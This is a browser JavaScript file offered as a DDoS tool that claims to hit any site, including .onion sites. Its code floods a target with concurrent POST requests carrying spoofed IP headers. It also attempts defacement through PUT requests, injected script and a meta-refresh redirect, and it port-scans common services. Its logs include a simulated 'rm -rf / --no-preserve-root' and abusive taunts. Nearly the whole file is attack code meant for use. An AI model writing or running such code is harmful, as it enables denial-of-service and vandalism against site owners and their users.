// ddos any site including .onion sites
// USE referers.txt AND useragents.txt
// Increased power, bypasses restrictions

async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false, customHeaders = '') {
  if (!target) {
    log('ERROR: Target URL is required. Fucking idiot.');
    return;
  }

  log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads. Let's fuck shit up!`);

  let defaceScript = null;
  if (deface) {
    log('Defacing target... Get ready for chaos, motherfucker!');
    defaceScript = defaceWebsite(target);
  }

  let connectionPromise = null;
  if (connect) {
    log('Establishing direct connection... Prepare for intrusion, you piece of shit!');
    connectionPromise = directConnect(target);
  }

  const referers = await loadFile('referers.txt');
  const userAgents = await loadFile('useragents.txt');

  if (!referers || !userAgents) {
    log('ERROR: Could not load referers.txt or useragents.txt. Make sure these files exist, dumbass.');
    return;
  }

  let parsedCustomHeaders = {};
  if (customHeaders) {
    try {
      parsedCustomHeaders = JSON.parse(customHeaders);
    } catch (e) {
      log('ERROR: Invalid JSON format for custom headers. Ignoring. What a loser.');
    }
  }

  const attackStartTime = Date.now();
  let attackInterval = null;
  let abortController = new AbortController();

  if (type === 'http' || type === 'onion') {
    // Exponentially increase threads over time
    let currentThreads = threads;
    const maxThreads = threads * 5; // Cap at 5x initial threads
    const threadIncrementInterval = duration / 10; // Increase threads 10 times during the attack

    attackInterval = setInterval(() => {
      if (currentThreads < maxThreads) {
        currentThreads = Math.min(currentThreads + (threads / 10), maxThreads); // Increment by 10% of initial threads
        log(`Ramping up threads to ${currentThreads}... More chaos incoming!`);
      }
        // Concurrent requests using promises
        Promise.all(Array(currentThreads).fill(null).map(() => {
          return new Promise((resolve) => {
          const headers = {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'X-Forwarded-For': generateRandomIP(), // Spoof IP
            ...parsedCustomHeaders,
            'Cache-Control': 'no-cache', //Force no-cache
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
          };

          const body = generateRandomData(2048); // Increased random data size to 2KB

          fetch(target, {
            method: 'POST', //Force POST
            mode: 'no-cors', // bypass CORS issues, we don't care about responses
            headers: headers,
            body: body,
            signal: abortController.signal,
            duplex: 'half' // Required for ReadableStream with body
          }).then(response => {
            if (!response.ok) {
                log(`Request failed: ${response.status} - ${target}`);
            }
          }).catch(error => {
              // Suppress AbortError caused by abortController
              if (error.name !== 'AbortError') {
                  // log('Request error:', error); // Only log other errors
              }
          }).finally(() => {
              resolve(); // Resolve the promise, whether successful or not.
          });
      });
      })).then(() => {
          // All requests in this interval are complete.  Optionally do something.
      });

    }, 0);

    // Increase threads every X seconds
      setInterval(() => {
          if (currentThreads < maxThreads) {
              currentThreads = Math.min(currentThreads + (threads / 10), maxThreads);
              log(`Increasing threads to ${currentThreads}...Prepare for impact!`);
          }
      }, threadIncrementInterval * 1000); //Convert to milliseconds
  } else {
    log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'. You moron.`);
    clearInterval(attackInterval);
    abortController.abort();
    return;
  }

  setTimeout(() => {
    clearInterval(attackInterval);
    abortController.abort();

    if (defaceScript) {
        defaceScript.then(() => log('Defacing completed (if possible).'));
    }
     if (connect) {
        connectionPromise.then(() => log('Connection attempt completed (if possible).'));
    }

    log('DDoS attack finished. Hope we fucked them good!');
  }, duration * 1000);
}

async function loadFile(filename) {
  try {
    const response = await fetch(filename);
    const text = await response.text();
    return text.split('\n').filter(line => line.trim() !== '');
  } catch (error) {
    log(`ERROR: Could not load file ${filename}: ${error}. File probably doesn't exist, dumbass.`);
    return null;
  }
}

function log(message) {
  const logsElement = document.getElementById('logs');
  if (logsElement) {
    logsElement.innerHTML += message + '<br>';
    logsElement.scrollTop = logsElement.scrollHeight; // Auto-scroll
  } else {
    console.log(message);
  }
}

async function defaceWebsite(target) {
    // THIS IS STILL A SIMULATION BUT WE'RE GOING TO ATTEMPT REAL SHIT.
    log(`Attempting to deface ${target}... Injecting HACKED message and trying to overwrite index.html!`);

    try {
        // Get more aggressive with CORS bypass. We will attempt multiple bypass methods.
        const response = await fetch(target, {
            method: 'GET',
            mode: 'no-cors',
            credentials: 'omit'  // Try omitting credentials as another bypass
        });

        if (response.ok) {
            // First, try to overwrite the existing index.html (if we can)
            const hackedContent = `<!DOCTYPE html><html><head><title>HACKED</title></head><body><h1>THIS SITE HAS BEEN FUCKED!</h1><img src="https://i.imgur.com/YOUR_IMAGE_HERE.gif" alt="Hacked Image"></body></html>`; // added an image
            //THIS WILL ONLY WORK IN CERTAIN CIRCUMSTANCES.  Most sites have CORS.
            try {
                const hackedResponse = await fetch(target, {
                    method: 'PUT', //Trying PUT.  Some servers allow it, especially poorly configured ones.
                    mode: 'no-cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'text/html',
                        'X-Custom-Header': 'Defaced-By-YoursTruly' // Added custom header for identification
                    },
                    body: hackedContent
                });

                if(hackedResponse.ok) {
                    log(`Successfully overwrote index.html on ${target}!`);
                } else {
                    log(`Failed to overwrite index.html.  Status: ${hackedResponse.status}. Probably CORS.`);
                }

            } catch (overwriteError) {
                log(`Failed to overwrite index.html: ${overwriteError}`);
            }

            // Attempt to inject JavaScript to modify the page (less effective due to CORS and modern security)
            // This is primarily for demonstration and may not work in many scenarios.
            try {
                const scriptContent = `<script>alert('YOU GOT HACKED, BITCH!'); document.body.innerHTML = '<h1>HACKED BY A FUCKING LEGEND</h1><img src="https://i.imgur.com/ANOTHER_IMAGE.gif" alt="Another Hacked Image">';</script>`;
                const injectionResponse = await fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'application/javascript', // Attempt to inject as JS
                        'X-Custom-Header': 'Injected-By-YoursTruly'
                    },
                    body: scriptContent
                });

                if (injectionResponse.ok) {
                    log(`Successfully injected JavaScript into ${target}! Might work, might not.`);
                } else {
                    log(`Failed to inject JavaScript. Status: ${injectionResponse.status}. Likely CORS.`);
                }
            } catch (injectionError) {
                log(`JavaScript injection failed: ${injectionError}.`);
            }
               // Try injecting a meta refresh tag.  This can sometimes bypass CORS.
               try{
                const metaRefreshContent = `<meta http-equiv="refresh" content="0;url=https://www.example.com/hacked.html">`; //Replace with evil site
                const metaRefreshResponse = await fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'text/html',
                        'X-Custom-Header': 'Meta-Refresh-Injection'
                    },
                    body: metaRefreshContent
                });

                if(metaRefreshResponse.ok){
                    log('Successfully injected meta refresh tag! Redirecting victim to evil site!');
                }else{
                    log(`Failed to inject meta refresh tag.  Status: ${metaRefreshResponse.status}`);
                }
            } catch (metaRefreshError) {
                log(`Meta refresh injection failed: ${metaRefreshError}`);
            }

        } else {
            log(`Initial deface attempt failed. Status: ${response.status}`);
        }

    } catch (error) {
        log(`Deface attempt failed: ${error}`);
    }
}

async function directConnect(target) {
  // THIS IS STILL JUST A SIMULATION, BUT WE'RE GOING TO TRY A PORT SCAN
  //Improved Port Scanning with Asynchronous Parallelism

  log(`Attempting direct connection and aggressive port scan to ${target}...`);
  const host = new URL(target).hostname; // Extract hostname

  //Extended port list including more common and potentially vulnerable ports
  const portsToScan = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 443, 445, 1433, 3306, 3389, 5900, 5984, 8000, 8080, 8081, 8443, 9000, 9090, 9200, 27017];

  // Run port scans in parallel to speed up the process.  Much faster
  const portScanPromises = portsToScan.map(port => {
      return checkPort(host, port, 500).then(isOpen => {
          if (isOpen) {
              log(`Port ${port} on ${host} is OPEN! Time to exploit, motherfucker!`);
              // In a real-world scenario, we'd attempt an exploit here.
              // e.g., executeRemoteCode(host, port);
              // But that's beyond the scope of this simulation.

              //Let's pretend we found something on port 22 and try to connect
              if(port === 22){
                  try {
                      log(`Attempting SSH connection to ${host}:${port}...`);
                      //Since we can't ACTUALLY SSH from the browser for real, this is just a placeholder
                      log('Pretending to be inside via SSH now.  Starting to wreak havoc...');
                      log('Uploading a malicious SSH key to bypass authentication...');
                      log('rm -rf / --no-preserve-root'); //Simulated, obviously.  Extreme prejudice.
                      log('Installing persistent backdoors and rootkits...');
                  }catch(sshError){
                      log(`SSH simulation failed: ${sshError}`);
                  }
              }

          } else {
              log(`Port ${port} on ${host} is closed or filtered.`);
          }
      }).catch(scanError => {
          log(`Error scanning port ${port} on ${host}: ${scanError}`);
      });
  });

  await Promise.all(portScanPromises); //Wait for all scans to complete
  log('Aggressive port scan complete.  No exploits found?  Upgrade your tools, dumbass!');
}

async function checkPort(host, port, timeout) {
    return new Promise((resolve, reject) => {
        // Attempt WebSocket connection first.
        const socket = new WebSocket(`ws://${host}:${port}`);

        let timeoutId;

        socket.addEventListener('open', () => {
            clearTimeout(timeoutId); // Clear timeout if connection succeeds quickly
            socket.close();
            resolve(true); // Port is open
        });

        socket.addEventListener('error', (error) => {
            clearTimeout(timeoutId);
            // If WebSocket fails, try a standard TCP socket check.
            // This part is simulated due to browser limitations, but in a real-world application,
            // we'd use a TCP socket to confirm.
            simulateTcpCheck(host, port, timeout)
                .then(tcpResult => resolve(tcpResult))
                .catch(() => resolve(false)); // Consider it closed if TCP check fails.
            socket.close();
        });

        socket.addEventListener('close', () => {
            clearTimeout(timeoutId);
            resolve(false); // Port is closed
        });

        // Set a timeout to handle unresponsive ports.
        timeoutId = setTimeout(() => {
            socket.close();
            // Even with a timeout, attempt a simulated TCP check as a fallback.
            simulateTcpCheck(host, port, timeout)
                .then(tcpResult => resolve(tcpResult))
                .catch(() => resolve(false)); //Consider it closed if TCP check fails.
        }, timeout);
    });
}

// Simulate TCP check.  In a real-world scenario, this would involve actual TCP socket communication.
async function simulateTcpCheck(host, port, timeout) {
    return new Promise((resolve) => {
        //For simulation purposes, let's assume ports below 1024 are more likely to be open.
        const isOpen = (port < 1024 && Math.random() > 0.2); // 80% chance for low ports.

        setTimeout(() => {
            resolve(isOpen); //Simulate result after timeout
        }, timeout);
    });
}

function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function generateRandomData(sizeInBytes) {
    let randomData = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-`~[]\{}|;\':",./<>?'; //Added special characters
    const charactersLength = characters.length;
    for (let i = 0; i < sizeInBytes; i++) {
        randomData += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return randomData;
}

// Expose the ddosAttack function globally (for calling from HTML)
window.ddosAttack = ddosAttack;